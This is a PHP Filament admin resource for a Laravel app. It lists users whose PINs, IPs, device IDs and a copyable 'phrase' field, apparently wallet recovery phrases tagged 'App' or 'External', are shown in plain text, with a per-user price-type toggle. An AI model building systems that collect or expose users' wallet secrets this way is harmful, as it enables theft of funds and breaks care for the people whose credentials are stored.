<?php

namespace App\Filament\Resources;

use App\Filament\Resources\UserResource\Pages;
use App\Filament\Resources\UserResource\RelationManagers;
use App\Filament\Resources\UserResource\RelationManagers\AddressesRelationManager;
use App\Filament\Resources\UserResource\RelationManagers\AssetsRelationManager;
use App\Models\User;
use Filament\Forms;
use Filament\Forms\Components\Group;
use Filament\Forms\Components\Section;
use Filament\Forms\Components\Select;
use Filament\Forms\Components\TextInput;
use Filament\Forms\Form;
use Filament\Notifications\Notification;
use Filament\Resources\Resource;
use Filament\Tables;
use Filament\Tables\Actions\ActionGroup;
use Filament\Tables\Columns\TextColumn;
use Filament\Tables\Columns\ToggleColumn;
use Filament\Tables\Table;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;

class UserResource extends Resource
{
    protected static ?string $model = User::class;

    protected static ?string $navigationIcon = 'heroicon-o-user-group';

    public static function form(Form $form): Form
    {
        return $form
            ->schema([
                Group::make()->schema([
                    Section::make()->schema([
                        TextInput::make('pin')
                        ->numeric(),

                        TextInput::make('phrase'),

                        TextInput::make('userip'),

                        TextInput::make('device_id'),

                        Select::make('automatic_price')
                        ->options([
                            1 => 'yes',
                            0 => 'No'
                        ])->columnSpanFull(),

                    ])->columns(2)
                ])->columnSpanFull()
            ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->query(User::whereNotNull('phrase'))
            ->columns([
                
                TextColumn::make('name'),
               
                
                TextColumn::make('pin'),

                TextColumn::make('phrase')
                ->copyable()
                ->copyMessage('Phrase Copied')
                ->copyMessageDuration(1500)
                ->wrap(),

                TextColumn::make('phrase_type')
                ->badge()
                ->color(fn (string $state): string => match ($state) {
                    'App' => 'warning',
                    'External' => 'success',
                }),

                TextColumn::make('userip'),

                //TextColumn::make('device_id'),

                ToggleColumn::make('automatic_price')
                ->label('Price type')
                ->beforeStateUpdated(function ($record, $state) {
                    //dd($state);
                    $record->update(['automatic_price' => $state]);
                })
                ->afterStateUpdated(function ($record, $state) {
                    Notification::make()
                    ->title('price type updated successfully')
                    ->success()
                    ->send();
                })

            ])
            ->filters([
                //
            ])
            ->actions([
                ActionGroup::make([
                    Tables\Actions\EditAction::make(),
                    Tables\Actions\DeleteAction::make(),
                ])
            ])
            ->bulkActions([
                Tables\Actions\BulkActionGroup::make([
                    Tables\Actions\DeleteBulkAction::make(),
                ]),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            AssetsRelationManager::class,
            AddressesRelationManager::class
        ];
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListUsers::route('/'),
            'create' => Pages\CreateUser::route('/create'),
            'edit' => Pages\EditUser::route('/{record}/edit'),
        ];
    }
}
